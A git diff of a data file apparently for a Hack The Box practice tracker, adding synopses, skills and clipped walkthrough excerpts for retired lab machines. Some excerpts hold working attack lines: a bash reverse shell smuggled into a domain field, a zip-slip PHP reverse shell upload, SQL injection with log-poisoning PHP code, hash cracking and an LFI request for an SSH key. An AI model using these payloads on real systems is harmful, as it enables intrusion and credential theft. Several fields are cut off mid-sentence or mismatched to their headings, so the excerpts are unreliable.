     "roomUrl": "https://app.hackthebox.com/machines/haystack",
     "writeupUrl": "https://0xdf.gitlab.io/tags#haystack",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Haystack is an Easy difficulty Linux box running the ELK stack ( Elasticsearch, Logstash and Kibana). The elasticsearch DB is found to contain many entries, among which are base64 encoded credentials, which can be used for SSH.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-06-29T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Haystack is an Easy difficulty Linux box running the ELK stack ( Elasticsearch, Logstash and Kibana). The elasticsearch DB is found to contain many entries, among which are base64 encoded credentials, which can be used for SSH. The kibana server running on localhost is found vulnerable to file inclusion, leading to code execution. The kibana user has access to the Logstash configuration which is set to execute files as root based on a certain filter.",
+    "skillsLearned": [
+      "Elasticsearch"
+    ],
+    "officialPdf": "195-Haystack_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHaystack is an Easy difficulty Linux box running the ELK stack ( Elasticsearch, Logstash and Kibana). The elasticsearch DB is found to contain many entries, among which are base64 encoded credentials, which can be used for SSH. The kibana server running on localhost is found vulnerable to file inclusion, leading to code execution. The kibana user has access to the Logstash configuration which is set to execute files as root based on a certain filter.\n\n### 🎯 Core Skills\n- **Elasticsearch**\n\n### 🛡️ Associated CVEs\n`CVE-2018-17246`\n\n### ⚔️ Foothold Vector\nThe quote is present in the \"_source\" field. We can now use \"._source.quote\" filter to access it directly. We were able to extract the quote string using the jq filters. Now the size can be set to 253 and all quotes can be displayed. curl -s 'http://10.10.10.115:9200/quotes/_search?size=253' | jq '.hits.hits | .[] | ._source.quote' > /tmp/quotes All the quotes present in the output are in Spanish. Manually looking through them we'll find these two uncommon sentences. Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk= They contain two base64 encoded strings which decode to:\n\n### 👑 Privilege Escalation\nbased on a certain filter. Skills Required ● Enumeration Skills Learned ● Elasticsearch enumeration ● Kibana File inclusion ● Logstash plugins and filters"
   },
   {
     "id": "htb-jarvis",
@@ -8708,10 +10377,17 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/jarvis",
     "writeupUrl": "https://0xdf.gitlab.io/tags#jarvis",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-06-22T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further",
+    "skillsLearned": [
+      "File writes through SQL injection",
+      "Exploiting systemctl GTFObin"
+    ],
+    "officialPdf": "194-Jarvis_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further\n\n### 🎯 Core Skills\n- **File writes through SQL injection**\n- **Exploiting systemctl GTFObin**\n\n### ⚔️ Foothold Vector\n. This service allows the writing of a shell to the web\n\n### 👑 Privilege Escalation\nfor the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged to gain a root shell. Skills Required ● SQL injection ● Linux Enumeration ● Command injection Skills Learned ● File writes through SQL injection ● Exploiting systemctl GTFObin"
   },
   {
     "id": "htb-chainsaw",
@@ -8722,15 +10398,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "IPFS",
+      "Slack-space-and-Bmap",
+      "Using-Web3.py-API"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/chainsaw",
     "writeupUrl": "https://0xdf.gitlab.io/tags#chainsaw",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Chainsaw is a Hard Linux machine with various components in place. The server is running an Ethereum node, which is used to store and retrieve data.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-06-15T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Chainsaw is a Hard Linux machine with various components in place. The server is running an Ethereum node, which is used to store and retrieve data. This can be modified by an attacker to set malicious data on the latest block and get code execution. The box contains an installation of IPFS ( Interplanetary File System ), and further",
+    "skillsLearned": [
+      "Solidity and Ethereum contracts",
+      "Using Web3.py API",
+      "IPFS",
+      "Slack space and Bmap"
+    ],
+    "officialPdf": "193-Chainsaw_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nChainsaw is a Hard Linux machine with various components in place. The server is running an Ethereum node, which is used to store and retrieve data. This can be modified by an attacker to set malicious data on the latest block and get code execution. The box contains an installation of IPFS ( Interplanetary File System ), and further\n\n### 🎯 Core Skills\n- **Solidity and Ethereum contracts**\n- **Using Web3.py API**\n- **IPFS**\n- **Slack space and Bmap**\n\n### ⚔️ Foothold Vector\nEdit the malicious_domain variable in the script. malicious_domain = \"google.com ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\" Start a listener on port 4444 and run the script again. A shell as the user administrator should be received. Looking at the passwd file we see that only bobby has a bash shell assigned to him.\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Python scripting ● Enumeration Skills Learned ● Solidity and Ethereum contracts ● Using Web3.py API ● IPFS ● Slack space and Bmap"
   },
   {
     "id": "htb-writeup",
@@ -8741,15 +10429,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Path-hijacking",
+      "Process"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/writeup",
     "writeupUrl": "https://0xdf.gitlab.io/tags#writeup",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS is found, and contains a SQL injection vulnerability, which is leveraged to gain user credentials.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-06-08T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS is found, and contains a SQL injection vulnerability, which is leveraged to gain user credentials. The user is found to be in a non-default group, which gives him write access to part of the PATH. A path hijacking results in escalation of privileges to root.",
+    "skillsLearned": [
+      "Path hijacking",
+      "Process"
+    ],
+    "officialPdf": "192-Writeup_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nWriteup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS is found, and contains a SQL injection vulnerability, which is leveraged to gain user credentials. The user is found to be in a non-default group, which gives him write access to part of the PATH. A path hijacking results in escalation of privileges to root.\n\n### 🎯 Core Skills\n- **Path hijacking**\n- **Process**\n\n### ⚔️ Foothold Vector\nWe can use hashcat to crack the MD5 hash. Copy the hash into a file in the format hash:salt and then use hashcat mode 20 to crack it. echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash hashcat -a 0 -m 20 hash rockyou.txt The hash is cracked as raykayjay9. The credentials jkr / raykayjay9 are used to SSH into the box. ssh jkr@10.10.10.138\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration Skills Learned ● Path hijacking ● Process enumeration"
   },
   {
     "id": "htb-smasher2",
@@ -8760,15 +10457,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-mmap-handlers",
+      "HTB",
+      "Reversing-shared-objects"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/smasher2",
     "writeupUrl": "https://0xdf.gitlab.io/tags#smasher2",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Smasher2 is an insane difficult linux machine, which requires knowledge of Python, C and kernel exploitation. A folder protected by Basic Authentication is brute-forced to gain source code for a session manager on one of the vhosts.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-06-01T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Smasher2 is an insane difficult linux machine, which requires knowledge of Python, C and kernel exploitation. A folder protected by Basic Authentication is brute-forced to gain source code for a session manager on one of the vhosts. A shared object file is used by the session manager which has a vulnerable function leading to credential leakage. Then a kernel module is found which uses a weak mmap handler and is exploited to gain a root shell.",
+    "skillsLearned": [
+      "Exploiting mmap handlers",
+      "Reversing shared objects"
+    ],
+    "officialPdf": "191-Smasher2_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSmasher2 is an insane difficult linux machine, which requires knowledge of Python, C and kernel exploitation. A folder protected by Basic Authentication is brute-forced to gain source code for a session manager on one of the vhosts. A shared object file is used by the session manager which has a vulnerable function leading to credential leakage. Then a kernel module is found which uses a weak mmap handler and is exploited to gain a root shell.\n\n### 🎯 Core Skills\n- **Exploiting mmap handlers**\n- **Reversing shared objects**\n\n### ⚔️ Foothold Vector\n. A folder protected by Basic Authentication is brute-forced to gain source code for a session manager on one of the vhosts. A shared object file is used by the session manager which has a vulnerable function leading to credential leakage. Then a kernel module is found which uses a weak mmap handler and is exploited to gain a\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Source code review ● Linux enumeration ● Kernel exploitation ● Reverse engineering Skills Learned ● Exploiting mmap handlers ● Reversing shared objects"
   },
   {
     "id": "htb-luke",
@@ -8779,15 +10485,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "NodeJs"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/luke",
     "writeupUrl": "https://0xdf.gitlab.io/tags#luke",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Luke is a medium difficulty Linux box featuring server",
     "timeSpentSeconds": 0,
     "createdAt": "2019-05-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Luke is a medium difficulty Linux box featuring server",
+    "skillsLearned": [
+      "NodeJs"
+    ],
+    "officialPdf": "190-Luke_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLuke is a medium difficulty Linux box featuring server\n\n### 🎯 Core Skills\n- **NodeJs**\n\n### ⚔️ Foothold Vector\nAfter checking these credentials against the /management page, we find that the user Derry can login. Once logged in, we'll find the configuration files and the login.php file. The config.php and login.php are same as earlier but the config.json is different. It seems to be the configuration for Ajenti on port 8000. Scrolling down a bit we see the password :\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration Skills Learned ● NodeJs enumeration"
   },
   {
     "id": "htb-ellingson",
@@ -8798,15 +10511,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Python-debugger-RCE",
+      "ROP-exploit"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ellingson",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ellingson",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Ellingson is a hard difficulty Linux box running a python flask server in debug mode, behind a nginx proxy. The debugger can be abused to execute code on the server in the context of the user running it.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-05-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ellingson is a hard difficulty Linux box running a python flask server in debug mode, behind a nginx proxy. The debugger can be abused to execute code on the server in the context of the user running it. The user is found to be in the adm group which has access to the shadow.bak file, from which hashes can be gained and cracked, which allows for lateral movement. A SUID binary is found to be vulnerable to a buffer overflow - but as ASLR and NX are enabled - a ROP based exploitation needs to be performed to gain a root shell.",
+    "skillsLearned": [
+      "Python debugger RCE",
+      "ROP exploit"
+    ],
+    "officialPdf": "189-Ellingson_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEllingson is a hard difficulty Linux box running a python flask server in debug mode, behind a nginx proxy. The debugger can be abused to execute code on the server in the context of the user running it. The user is found to be in the adm group which has access to the shadow.bak file, from which hashes can be gained and cracked, which allows for lateral movement. A SUID binary is found to be vulnerable to a buffer overflow - but as ASLR and NX are enabled - a ROP based exploitation needs to be performed to gain a root shell.\n\n### 🎯 Core Skills\n- **Python debugger RCE**\n- **ROP exploit**\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Exploit development ● Scripting Skills Learned ● Python debugger RCE ● ROP exploit"
   },
   {
     "id": "htb-swagshop",
@@ -8817,15 +10539,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "CVE-2015-1397",
+      "Exploit-modification",
+      "GTFObins",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/swagshop",
     "writeupUrl": "https://0xdf.gitlab.io/tags#swagshop",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "SwagShop is an easy difficulty linux box running an old version of Magento. The version is vulnerable to SQLi and RCE leading to a shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-05-11T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "SwagShop is an easy difficulty linux box running an old version of Magento. The version is vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root which can abused to execute commands.",
+    "skillsLearned": [
+      "Exploit modification",
+      "GTFObins"
+    ],
+    "officialPdf": "188-SwagShop_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSwagShop is an easy difficulty linux box running an old version of Magento. The version is vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root which can abused to execute commands.\n\n### 🎯 Core Skills\n- **Exploit modification**\n- **GTFObins**\n\n### 🛡️ Associated CVEs\n`CVE-2015-1397`\n\n### ⚔️ Foothold Vector\nSearching on exploit-db for exploits related to magento we come across this. It's an authenticated RCE exploit. As we already have the credentials we can try using it. The exploit doesn't work out of the box and it needs some changes. First we need to change the install date as specified by the author. This can be found in the local.xml file from earlier. Now let's replicate what the script does. It first creates a mechanize browser object and then logs the user in. Let's make that request and intercept it via burp. The creds are ypwq / 123. Send the request to repeater and login.\n\n### 👑 Privilege Escalation\nwhich can abused to execute commands. Skills Required ● None Skills Learned ● Exploit modification ● GTFObins"
   },
   {
     "id": "htb-ghoul",
@@ -8836,15 +10568,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-18925",
+      "Git-reflog",
+      "Gogs-RCE",
+      "HTB",
+      "ZipSlip-vulnerability"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ghoul",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ghoul",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Ghoul is a hard difficulty linux box which tests",
     "timeSpentSeconds": 0,
     "createdAt": "2019-05-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ghoul is a hard difficulty linux box which tests",
+    "skillsLearned": [
+      "ZipSlip vulnerability",
+      "Gogs RCE",
+      "Git reflog"
+    ],
+    "officialPdf": "187-Ghoul_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nGhoul is a hard difficulty linux box which tests\n\n### 🎯 Core Skills\n- **ZipSlip vulnerability**\n- **Gogs RCE**\n- **Git reflog**\n\n### 🛡️ Associated CVEs\n`CVE-2018-18925`\n\n### ⚔️ Foothold Vector\nLet's repeat the above process with depth as 2. rm evil.zip python evilarc.py -o unix -d 2 -p var/www/html/archives php-reverse-shell.php Now upload the zip file. Trying to CURL the page again, we see that it hits. And we have a shell.\n\n### 👑 Privilege Escalation\n. An incoming SSH connection is found to be using SSH agent forwarding, and can be hijacked to gain root shell on the host. Skills Required ● Enumeration ● Pivoting Skills Learned ● ZipSlip vulnerability ● Gogs RCE ● Git reflog"
   },
   {
     "id": "htb-onetwoseven",
@@ -8855,15 +10599,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Apache-rules",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/onetwoseven",
     "writeupUrl": "https://0xdf.gitlab.io/tags#onetwoseven",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "OneTwoSeven is a hard difficulty Linux box which provides users with SFTP access. The SFTP shell allows for creating symlinks, which can be abused to gain access to the administrative panel.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-04-20T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "OneTwoSeven is a hard difficulty Linux box which provides users with SFTP access. The SFTP shell allows for creating symlinks, which can be abused to gain access to the administrative panel. The admin panel has a restricted upload imposed by Apache rewrite rules. These can be bypassed to upload a php shell. The www user has permissions to upgrade local packages, but due to a misconfiguration, a proxy server can be used to install a malicious package to execute code as root.",
+    "skillsLearned": [
+      "Apache rules",
+      "Abusing apt package manager"
+    ],
+    "officialPdf": "185-OneTwoSeven_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOneTwoSeven is a hard difficulty Linux box which provides users with SFTP access. The SFTP shell allows for creating symlinks, which can be abused to gain access to the administrative panel. The admin panel has a restricted upload imposed by Apache rewrite rules. These can be bypassed to upload a php shell. The www user has permissions to upgrade local packages, but due to a misconfiguration, a proxy server can be used to install a malicious package to execute code as root.\n\n### 🎯 Core Skills\n- **Apache rules**\n- **Abusing apt package manager**\n\n### ⚔️ Foothold Vector\nWe find an upload feature in the admin page. But the button is disabled. The page even allows download of the addons using the DL button beside it. Let's view the OTS Manager addon. It says we can't directly upload the addons by accessing the addon-upload.php page directly. The rewrite rule matches the URI \"addon-upload.php\" or \"addon-download.php\" and replaces it with \"addons/ots-man-addon.php\". The [L] flag stands for Last which stops processing if the particular pattern is matched.\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration Skills Learned ● Apache rules ● Abusing apt package manager"
   },
   {
     "id": "htb-unattended",
@@ -8874,15 +10626,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Analyzing-kernel-image",
+      "HTB",
+      "LFI-to-RCE"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/unattended",
     "writeupUrl": "https://0xdf.gitlab.io/tags#unattended",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Unattended is a medium difficulty Linux box which needs a good knowledge of SQL and its programming flaws. A path traversal on the web server can be exploited to get the source code of the PHP pages.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-04-13T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Unattended is a medium difficulty Linux box which needs a good knowledge of SQL and its programming flaws. A path traversal on the web server can be exploited to get the source code of the PHP pages. A SQL injection flaw is found, which can be exploited using nested unions to gain LFI. The LFI can then be leveraged to RCE via log files or sessions file. Database access allows the www user to change the configuration and inject commands into a cronjob running as a user. The user is a member of the grub group, which has access to the kernel image through which the root password can be obtained.",
+    "skillsLearned": [
+      "Union based SQL injection",
+      "LFI to RCE",
+      "Analyzing kernel image"
+    ],
+    "officialPdf": "184-Unattended_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUnattended is a medium difficulty Linux box which needs a good knowledge of SQL and its programming flaws. A path traversal on the web server can be exploited to get the source code of the PHP pages. A SQL injection flaw is found, which can be exploited using nested unions to gain LFI. The LFI can then be leveraged to RCE via log files or sessions file. Database access allows the www user to change the configuration and inject commands into a cronjob running as a user. The user is a member of the grub group, which has access to the kernel image through which the root password can be obtained.\n\n### 🎯 Core Skills\n- **Union based SQL injection**\n- **LFI to RCE**\n- **Analyzing kernel image**\n\n### ⚔️ Foothold Vector\nNow that we have LFI we can leverage it to RCE by using nginx log file poisoning. Usually the access.log file logs the user-agent. We can change this using Burp and get RCE. The usual location of the nginx access log is at /var/log/nginx/access.log. https://www.nestedflanders.htb/index.php?id=25' union select \"main' union select '/var/log/nginx/access.log' LIMIT 1,1;-- -\" LIMIT 1,1;-- - We see the response containing the logs of the requests and user agents. Let's change the user agent to: <?php system('whoami'); ?>\n\n### 👑 Privilege Escalation\npassword can be obtained. Skills Required ● Enumeration ● Code review ● SQL Skills Learned ● Union based SQL injection ● LFI to RCE ● Analyzing kernel image"
   },
   {
     "id": "htb-kryptos",
@@ -8893,15 +10655,31 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Analysing-RNG",
+      "Exploiting-RC4-flaws",
+      "HTB",
+      "PDO-Injection",
+      "Python-eval-injection",
+      "RCE-via-SQLite3"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/kryptos",
     "writeupUrl": "https://0xdf.gitlab.io/tags#kryptos",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "KryptOS is an insane difficulty Linux box which requires knowledge of how cryptographic algorithms work. A login page is found to be vulnerable to PDO injection, and can be hijacked to gain access to the encrypting page.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-04-06T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "KryptOS is an insane difficulty Linux box which requires knowledge of how cryptographic algorithms work. A login page is found to be vulnerable to PDO injection, and can be hijacked to gain access to the encrypting page. The page uses RC4 to encrypt files, which can be subjected to a known plaintext attack. This can be used to abuse a SQL injection in an internal web application to dump code into a file, and execute it to gain a shell. A Vimcrypt file is found, which uses a broken algorithm and can be decrypted.",
+    "skillsLearned": [
+      "PDO Injection",
+      "Exploiting RC4 flaws",
+      "RCE via SQLite3",
+      "Decrypting Vimcrypt files",
+      "Analysing RNG",
+      "Python eval injection"
+    ],
+    "officialPdf": "183-Kryptos_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nKryptOS is an insane difficulty Linux box which requires knowledge of how cryptographic algorithms work. A login page is found to be vulnerable to PDO injection, and can be hijacked to gain access to the encrypting page. The page uses RC4 to encrypt files, which can be subjected to a known plaintext attack. This can be used to abuse a SQL injection in an internal web application to dump code into a file, and execute it to gain a shell. A Vimcrypt file is found, which uses a broken algorithm and can be decrypted.\n\n### 🎯 Core Skills\n- **PDO Injection**\n- **Exploiting RC4 flaws**\n- **RCE via SQLite3**\n- **Decrypting Vimcrypt files**\n- **Analysing RNG**\n- **Python eval injection**\n\n### 👑 Privilege Escalation\nfolder we find a login page. Looking at the HTML source we see that the page sends \"db\" and \"token\" values along with the username and password, which is uncommon. Let's send this to Burp and try to inspect it's behaviour."
   },
   {
     "id": "htb-lacasadepapel",
@@ -8912,15 +10690,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Linux-inode-knowledge"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/lacasadepapel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#lacasadepapel",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "LaCasaDePapel is an easy difficulty Linux box, which is running a backdoored vsftpd server. The backdoored port is running a PHP shell with disabled_functions.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-03-30T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "LaCasaDePapel is an easy difficulty Linux box, which is running a backdoored vsftpd server. The backdoored port is running a PHP shell with disabled_functions. This is used to read a CA certificate, from which a client certificate can be created. The HTTPS page is vulnerable to LFI, leading to exposure of SSH keys. A configuration file can be hijacked to gain code execution as root.",
+    "skillsLearned": [
+      "Linux inode knowledge",
+      "Creating client certificates"
+    ],
+    "officialPdf": "181-LaCasaDePapel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLaCasaDePapel is an easy difficulty Linux box, which is running a backdoored vsftpd server. The backdoored port is running a PHP shell with disabled_functions. This is used to read a CA certificate, from which a client certificate can be created. The HTTPS page is vulnerable to LFI, leading to exposure of SSH keys. A configuration file can be hijacked to gain code execution as root.\n\n### 🎯 Core Skills\n- **Linux inode knowledge**\n- **Creating client certificates**\n\n### ⚔️ Foothold Vector\nNow let's try the path to read id_rsa. curl -k https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= We see that it worked and we have the private key. Copy it to a file and use it to ssh in. As we don't know the username yet, we'll try each one from the list we obtained earlier. Trying each one of them we find that the key belongs to \"professor\".\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration Skills Learned ● Linux inode knowledge ● Creating client certificates"
   },
   {
     "id": "htb-helpline",
@@ -8931,15 +10717,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Applocker",
+      "CVE-2017-9362",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/helpline",
     "writeupUrl": "https://0xdf.gitlab.io/tags#helpline",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Helpline is a hard difficulty windows box which needs a good amount of",
     "timeSpentSeconds": 0,
     "createdAt": "2019-03-23T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Helpline is a hard difficulty windows box which needs a good amount of",
+    "skillsLearned": [
+      "Applocker"
+    ],
+    "officialPdf": "180-Helpline_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHelpline is a hard difficulty windows box which needs a good amount of\n\n### 🎯 Core Skills\n- **Applocker**\n\n### 🛡️ Associated CVEs\n`CVE-2017-9362`\n\n### ⚔️ Foothold Vector\n. There are hashes on the PostgreSQL database which can be cracked to gain access to a user who can read Windows Event Logs. These logs contain user credentials and can be used to move laterally. Enumeration of the file system reveals a script vulnerable to command injection, which allow for code execution in the context of another user. The local Administrator credentials are then found in the form of powershell securestring. Skills Required ● Enumeration ● Powershell Skills Learned ● XXE ● Applocker enumeration ● Event log enumeration\n\n### 👑 Privilege Escalation\nquickbreach/powershell-ntlm Let's try to login as alice with the gained credentials now. $pass = ConvertTo-SecureString '$sys4ops@megabank!' -AsPlainText -Force $cred = new-object System.Management.Automation.PSCredential('alice', $pass) $session = New-PSSession -ComputerName 10.10.10.132 -Credential $cred -Authentication Negotiate Enter-PSSession $session And we have a session as alice on the box. The box has strict AppLocker policy, and Powershell Constrained Language Mode is enabled, so we can't directly use automated tools to enumerate, which calls for manual enumeration."
   },
   {
     "id": "htb-arkham",
@@ -8950,15 +10744,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Java-Deserialization",
+      "UAC-bypass"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/arkham",
     "writeupUrl": "https://0xdf.gitlab.io/tags#arkham",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Arkham is a medium difficulty Windows box which needs knowledge about encryption, java deserialization and Windows exploitation. A disk image present in an open share is found which is a LUKS encrypted disk.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-03-16T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
